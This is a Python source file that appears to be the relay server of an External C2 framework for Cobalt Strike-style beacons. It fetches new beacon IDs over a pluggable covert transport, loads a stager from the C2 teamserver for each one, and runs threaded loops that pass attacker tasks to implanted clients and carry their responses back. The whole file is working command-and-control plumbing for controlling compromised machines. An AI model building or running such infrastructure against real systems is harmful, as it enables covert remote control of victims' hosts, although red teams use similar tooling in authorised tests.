import sys
import argparse
from utils import commonUtils
import configureStage
import establishedSession
import config
from time import sleep
from threading import Thread
import uuid

def importModule(modName, modType):
	"""
	Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
	"""
	prep_global = "global " + modType
	exec(prep_global)
	importName = "import utils." + modType + "s." + modName + " as " + modType
	exec(importName, globals())

def createConnection(beaconId):
	"""
	Function responsible for configuring the initial stager
	for an incoming connection. Will return the socket connection
	responsible for issuing tasks.

	Returns:
		socket connection to the Teamserver
	"""
	# Start with logic to setup the connection to the external_c2 server
	sock = commonUtils.createSocket()

	# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
	# Poll covert channel for 'READY2INJECT' message from client
	#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
	# if args.verbose:
	#       print commonUtils.color("Client ready to recieve stager")

	# #####################

	# Prep the transport module
	prep_trans = transport.prepTransport()

	# Let's get the stager from the c2 server
	stager_status = configureStage.loadStager(sock, beaconId)

	if stager_status != 0:
		# Something went horribly wrong
		print commonUtils.color("Something went terribly wrong while configuring the stager!", status=False, warning=True)
		sys.exit(1)
	return sock

def taskLoop(sock, beaconId):
	while True:
		if config.verbose:
			print commonUtils.color("Checking the c2 server for {} tasks...".format(beaconId))

		newTask = establishedSession.checkForTasks(sock)

		# once we have a new task (even an empty one), lets relay that to our client
		if config.debug:
			print commonUtils.color("Encoding and relaying task to {}".format(beaconId), status=False, yellow=True)
		establishedSession.relayTask(newTask, beaconId)
		# Attempt to retrieve a response from the client
		if config.verbose:
			print commonUtils.color("Checking {} for a response...".format(beaconId))

		b_responses = establishedSession.checkForResponse(beaconId)
		# b_response = establishedSession.checkForResponse(beaconId)
		for b_response in b_responses:
		# Let's relay this response to the c2 server
			establishedSession.relayResponse(sock, b_response)
			sleep(config.C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds


def main():
	# Argparse for certain options
	parser = argparse.ArgumentParser()
	parser.add_argument('-v', action='store_true', help='Enable verbose output', dest='verbose', default=False)
	parser.add_argument('-d', action='store_true', help='Enable debugging output', dest='debug', default=False)


	# Call arguments with args.$ARGNAME
	args = parser.parse_args()

	# Assign the arguments to config.$ARGNAME
	if not config.verbose:
		config.verbose = args.verbose
	if not config.debug:
		config.debug = args.debug

	# Enable verbose output if debug is enabled
	if config.debug:
		config.verbose = True

	# Import our defined encoder, transport and manager modules
	if config.verbose:
		print (commonUtils.color("Importing encoder module: ") + "%s") % (config.ENCODER_MODULE)
	importModule(config.ENCODER_MODULE, "encoder")
	commonUtils.importModule(config.ENCODER_MODULE, "encoder")
	if config.verbose:
		print (commonUtils.color("Importing transport module: ") + "%s") % (config.TRANSPORT_MODULE)
	importModule(config.TRANSPORT_MODULE, "transport")
	commonUtils.importModule(config.TRANSPORT_MODULE, "transport")
	
	#####################################
	# Need to set up the new incoming   #
	# connection logic here for sorting #
	#####################################
	beacons = {}
	try:
		while True:
			# Some logic in determining if new agents are available
			newBeacons = transport.fetchNewBeacons()
			# newBeacons should be a list of uuid4() strings
			if newBeacons:
				for beaconId in newBeacons:
					# Create and open the connection here
					sock = createConnection(beaconId)
					# Tell the socket to begin its task looping
					t = Thread(target=taskLoop, args=(sock, beaconId))
					t.daemon = True
					print "[+] Established new session {}. Staring task loop.".format(beaconId)
					t.start()
					# Save conneciton information for a beacon
					beacons[beaconId] = sock
			sleep(config.IDLE_TIME)
	except KeyboardInterrupt:
		if config.debug:
			print commonUtils.color("\nClosing the socket connections to the c2 server")
		for beaconId, socketConnection in beacons.items():
			commonUtils.killSocket(socketConnection)
			print commonUtils.color("\nKilling Beacon {}...".format(beaconId), warning=True)
		sys.exit(0)

main()
